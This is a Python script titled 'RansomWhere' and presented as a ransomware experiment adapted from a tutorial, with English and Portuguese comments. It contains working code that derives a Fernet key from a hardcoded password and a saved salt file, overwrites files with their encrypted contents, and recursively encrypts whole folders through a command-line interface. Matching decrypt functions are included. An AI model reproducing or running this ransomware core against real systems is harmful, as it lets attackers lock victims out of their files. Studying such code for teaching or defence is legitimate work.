print(".______           ___      .__   __.      _______.  ______   .___  ___. ____    __    ____  __    __   _______ .______       _______  ______")
print("|   _  \         /   \     |  \ |  |     /       | /  __  \  |   \/   | \   \  /  \  /   / |  |  |  | |   ____||   _  \     |   ____||      \\")
print("|  |_)  |       /  ^  \    |   \|  |    |   (----`|  |  |  | |  \  /  |  \   \/    \/   /  |  |__|  | |  |__   |  |_)  |    |  |__   `----)  | ")
print("|      /       /  /_\  \   |  . `  |     \   \    |  |  |  | |  |\/|  |   \            /   |   __   | |   __|  |      /     |   __|      /  /  ")
print("|  |\  \----. /  _____  \  |  |\   | .----)   |   |  `--'  | |  |  |  |    \    /\    /    |  |  |  | |  |____ |  |\  \----.|  |____    |__|   ")
print("| _| `._____|/__/     \__\ |__| \__| |_______/     \______/  |__|  |__|     \__/  \__/     |__|  |__| |_______|| _| `._____||_______|    __    ")
print("                                                                                                                                        (__)   ")
# print(" Ransomware Conceptual Experiment Based on the excelent work of thepythoncode.com/article/make-a-ransomware-in-python")

import pathlib
import secrets
import os
import base64
import sys
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt

hardcoded_password = "BeYr_OwnSt4R!"

# We are using the secrets module instead of random because secrets is used for generating cryptographically strong
# random numbers suitable for password generation, security tokens, salts, etc.
def generate_salt(size=16):
    """ Generate the salt used for key derivation, size is the length of the salt to generate"""
    sal = secrets.token_bytes(size)
    with open('ransomwhere.bin', 'wb') as salt_file:
        salt_file.write(sal)
    return sal


# Let’s make a function to derive the key from the password and the salt. We initialize the Scrypt algorithm by passing
# the following: The salt.
# The desired length of the key (32 in this case).
# n: CPU/Memory cost parameter which must be larger than 1 and be a power of 2.
# r: Block size parameter.
# p: Parallelization parameter.
# As mentioned in the documentation, n, r, and p can adjust the computational and memory cost of the Scrypt algorithm.
# RFC 7914 recommends r=8, p=1, where the original Scrypt paper suggests that n should have a minimum value of 2**14 for
# interactive logins or 2**20 for more sensitive files, you can check the documentation for more information.
def derive_key(salt, password):
    """Derive the key from the 'password' using the passed salt """
    kdf = Scrypt(salt=salt, length=32, n=2**14, r=8, p=1)
    return kdf.derive(password.encode())


# make a function to load a previously generated salt from salt.bin file
def load_salt():
    try:
        return open('ransomwhere.bin','rb').read()
    except Exception as e:
        print(f"Erro: {e}")
        return generate_salt()


# Now that we have the salt generation and key derivation functions, let's make the core function that generates the
# key from a password:
def generate_key(password, salt_size=16, load_existing_salt=False, save_salt=True):
    """Gera uma chave de uma 'senha' e sal. Se o parametro de carregar sal existente é verdadeiro, carrega o salt
    do arquivo salt.bin. Se salvar sal for verdadeiro, ele gerara um novo sal e gravara em salt.bin"""
    if load_existing_salt:
        salt=load_salt()
    elif save_salt:
        # Gera novo sal e salva
        salt=generate_salt(salt_size)
    # gera nova chave derivada
    derived_key = derive_key(salt,password)

    # encode em base64 e devolve
    return base64.urlsafe_b64encode(derived_key)

    # The above function accepts the following arguments:
    # password: The password string to generate the key from.
    # salt_size: An integer indicating the size of the salt to generate.
    # load_existing_salt: A boolean indicating whether we load a previously generated salt.
    # save_salt: A boolean to indicate whether we save the generated salt.
    # After we load or generate a new salt, we derive the key from the password using our derive_key()
    # function and return the key as a Base64-encoded text.


#                                         _
#   ___  _ __    ___  _ __  _   _  _ __  | |_   ___   _ __
#  / _ \| '_ \  / __|| '__|| | | || '_ \ | __| / _ \ | '__|
# |  __/| | | || (__ | |   | |_| || |_) || |_ | (_) || |
#  \___||_| |_| \___||_|    \__, || .__/  \__| \___/ |_|
#                           |___/ |_|

def encrypt(filename, key):
    """Given a filename (str) and key (bytes) encrypts the file"""
    f = Fernet(key)
    with open(filename,"rb") as file:
        file_data = file.read()

    # Encrypt
    encrypted_data = f.encrypt(file_data)

    with open(filename,"wb") as file:
        file.write(encrypted_data)



#      _                                  _
#   __| |  ___   ___  _ __  _   _  _ __  | |_   ___   _ __
#  / _` | / _ \ / __|| '__|| | | || '_ \ | __| / _ \ | '__|
# | (_| ||  __/| (__ | |   | |_| || |_) || |_ | (_) || |
#  \__,_| \___| \___||_|    \__, || .__/  \__| \___/ |_|
#                           |___/ |_|

def decrypt(filename, key):

    """Given a filename (str) and key (bytes) decrypts file"""
    f = Fernet(key)
    with open(filename, "rb") as file:
       encrypted_data = file.read()

    # decrypt
    try:
        decrypted_data = f.decrypt(encrypted_data)
        with open(filename,"wb") as file:
            file.write(decrypted_data)
    except Exception as e:
        print(f"Erro: {e}")


#
# FOLDERS: ransomware encrypts entire folders or even the entire computer system, not just a single file.
# Code to encrypt folders with their subfolders and files
#   __         _      _
#  / _|  ___  | |  __| |  ___  _ __  ___
# | |_  / _ \ | | / _` | / _ \| '__|/ __|
# |  _|| (_) || || (_| ||  __/| |   \__ \
# |_|   \___/ |_| \__,_| \___||_|   |___/
#

# Not that complicated; we use the glob() method from the pathlib module’s Path() class to get all the subfolders and
# files in that folder. It is the same as os.scandir() except that pathlib returns Path objects and not regular Python
# strings. Inside the for loop, we check if this child path object is a file or a folder. We use our previously defined
# encrypt() function if it is a file. If it's a folder, we recursively run the encrypt_folder() but pass the child path
# into the foldername argument.
def encrypt_folder(foldername, key):
    # se for pasta de arquivos, criptografa a pasta inteira
    for child in pathlib.Path(foldername).glob("*"):
        if child.is_file():
            print(f"[*] Encrypting {child}")
            encrypt(child, key)
        elif child.is_dir():
            encrypt_folder(child, key)

def decrypt_folder(foldername, key):
    for child in pathlib.Path(foldername).glob("*"):
        if child.is_file():
            print(f"[+] Decrypting {child}")
            decrypt(child, key)
        elif child.is_dir():
            decrypt_folder(child, key)

#                    _
#  _ __ ___    __ _ (_) _ __
# | '_ ` _ \  / _` || || '_ \
# | | | | | || (_| || || | | |
# |_| |_| |_| \__,_||_||_| |_|
#

if __name__ == '__main__':
    import argparse

    parser = argparse.ArgumentParser(description="File Encryptor Script")
    parser.add_argument("path", nargs="?",help="Path or file to work", default=None)
    parser.add_argument("-s", "--salt-size", help="If passed, a new salt with the defined size will be generated", type=int)
    parser.add_argument("-e", "--encrypt", action="store_true", help="Criptografa a pasta ou arquivo")
    parser.add_argument("-d", "--decrypt", action="store_true", help="Descriptografa a pasta ou arquivo")

    args = parser.parse_args()

    if args.path is None:
        print("EXEMPLO DE USO:\npython RansomWhere.py -e folder_teste\npython RansomWhere.py -d folder_teste\npython RansomWhere.py -h")
        sys.exit()

    if args.salt_size:
        key = generate_key(hardcoded_password, salt_size=args.salt_size, save_salt=True)
    else:
        key = generate_key(hardcoded_password, load_existing_salt=True)

    _encrypt = args.encrypt
    _decrypt = args.decrypt

    if _encrypt and _decrypt:
        raise TypeError("Você não pode assobiar e chupar cana. Escolha criptografar ou descriptografar.")

    elif _encrypt:
        if os.path.isfile(args.path):
            encrypt(args.path, key)
        elif os.path.isdir(args.path):
            encrypt_folder(args.path, key)

    elif _decrypt:
        if os.path.isfile(args.path):
            decrypt(args.path, key)
        elif os.path.isdir(args.path):
            decrypt_folder(args.path, key)
